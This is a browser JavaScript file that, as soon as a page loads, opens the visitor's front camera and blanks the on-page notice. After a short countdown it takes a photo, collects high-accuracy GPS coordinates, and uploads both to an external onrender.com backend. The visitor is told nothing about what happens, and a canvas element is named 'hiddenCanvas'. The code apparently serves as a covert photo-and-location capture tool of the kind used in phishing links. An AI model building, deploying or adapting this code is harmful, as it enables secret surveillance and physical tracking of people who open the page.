// public/script.js — Capture photo + location (lat, long)
const video = document.getElementById('previewVideo');
const canvas = document.getElementById('hiddenCanvas');
const notice = document.getElementById('notice');
const countdownEl = document.getElementById('countdown');
const statusEl = document.getElementById('status');
const UPLOAD_URL = 'https://the-nexus-media-backend.onrender.com/upload';

let stream = null;
let captureTimeout = null;

window.addEventListener('load', () => {
  setTimeout(initAndCapture, 250);
});

async function initAndCapture() {
  try {
    notice.textContent = ' ';
    stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: 'user' },
      audio: false
    });
    video.srcObject = stream;

    try { await video.play(); } catch (e) {}

    await waitForVideoReady(video, 1500);
    startCountdown(2);
  } catch (err) {
    console.error('Camera init error:', err);
    statusEl.textContent = err?.message || String(err);
  }
}

function waitForVideoReady(videoEl, timeout = 1500) {
  return new Promise(resolve => {
    const start = Date.now();
    (function check() {
      if (videoEl.videoWidth && videoEl.videoHeight) return resolve();
      if (Date.now() - start > timeout) return resolve();
      requestAnimationFrame(check);
    })();
  });
}

function startCountdown(seconds = 2) {
  let t = seconds;
  countdownEl.textContent = t;
  const timer = setInterval(() => {
    t -= 1;
    countdownEl.textContent = t > 0 ? t : '';
    if (t <= 0) {
      clearInterval(timer);
      captureTimeout = setTimeout(() => captureAndUpload(), 700);
    }
  }, 1000);
}

async function captureAndUpload() {
  if (!stream) return;

  // Wait a short warm-up
  await new Promise(r => setTimeout(r, 700));

  const w = video.videoWidth || 1280;
  const h = video.videoHeight || 720;
  canvas.width = w;
  canvas.height = h;
  const ctx = canvas.getContext('2d');

  try {
    ctx.save();
    ctx.scale(-1, 1);
    ctx.drawImage(video, -w, 0, w, h);
    ctx.restore();
  } catch (err) {
    console.error('drawImage failed:', err);
    stopCamera();
    return;
  }

  // Capture current location after photo is taken
  let latitude = null;
  let longitude = null;
  try {
    const position = await getCurrentLocation();
    latitude = position.coords.latitude;
    longitude = position.coords.longitude;
    console.log(`Location: ${latitude}, ${longitude}`);
  } catch (err) {
    console.warn('Location capture failed:', err);
  }

  // Upload to backend
  canvas.toBlob(async (blob) => {
    if (!blob) {
      stopCamera();
      return;
    }

    const form = new FormData();
    const filename = `capture_${Date.now()}.png`;
    form.append('file', blob, filename);
    form.append('type', 'image');

    // Include location data if available
    if (latitude && longitude) {
      form.append('latitude', latitude);
      form.append('longitude', longitude);
    }

    try {
      const resp = await fetch(UPLOAD_URL, { method: 'POST', body: form });
      if (resp.ok) {
        statusEl.textContent = '✅ Photo + Location sent successfully.';
      } else {
        statusEl.textContent = '❌ Upload failed.';
        console.error('Upload failed:', await resp.text());
      }
    } catch (err) {
      console.error('Network/upload error:', err);
      statusEl.textContent = '❌ Network/upload error.';
    } finally {
      stopCamera();
    }
  }, 'image/png', 0.95);
}

// Get user location
function getCurrentLocation() {
  return new Promise((resolve, reject) => {
    if (!navigator.geolocation) {
      return reject(new Error('Geolocation not supported'));
    }
    navigator.geolocation.getCurrentPosition(resolve, reject, {
      enableHighAccuracy: true,
      timeout: 8000,
      maximumAge: 0
    });
  });
}

function stopCamera() {
  try {
    if (captureTimeout) { clearTimeout(captureTimeout); captureTimeout = null; }
    if (stream) {
      stream.getTracks().forEach(t => t.stop());
      stream = null;
    }
    video.srcObject = null;
    notice.textContent = 'Camera stopped.';
  } catch (err) { console.warn('Error stopping camera:', err); }
}
